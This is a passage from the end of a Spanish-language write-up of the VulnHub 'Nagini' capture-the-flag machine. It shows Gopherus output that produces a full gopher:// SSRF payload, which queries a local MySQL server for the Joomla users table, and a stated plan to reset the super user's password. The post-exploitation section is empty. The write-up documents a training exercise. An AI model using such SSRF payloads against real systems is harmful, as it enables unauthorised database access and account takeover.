 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
        \/       |__|        \/     \/                 \/                                                                                                                                                        
                                                                                                                                                                                                                 
                author: $_SpyD3r_$                                                                                                                                                                               
                                                                                                                                                                                                                 
For making it work username should not be password protected!!!

Give MySQL username: goblin                                                                                                                                                                                      
Give query to execute: use joomla; select * from joomla_users; 

Your gopher link is ready to do SSRF :                                                                                                                                                                           
                                                                                                                                                                                                                 
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%28%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01
```

Lo mismo:

<p align="center">
<img src="/assets/images/vulnhub-writeup-nagini/Captura15.png">
</p>

Obtuvimos un usuario llamado site_admin, que al parecer es un super usuario y el hash de su contraseña.

Podríamos tratar de crackear el hash, pero esto no va a funcionar.

Lo que haremos, será cambiar la contraseña del super usuario, para poder entrar al login de **Joomla**.



<h2 id=""></h2>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
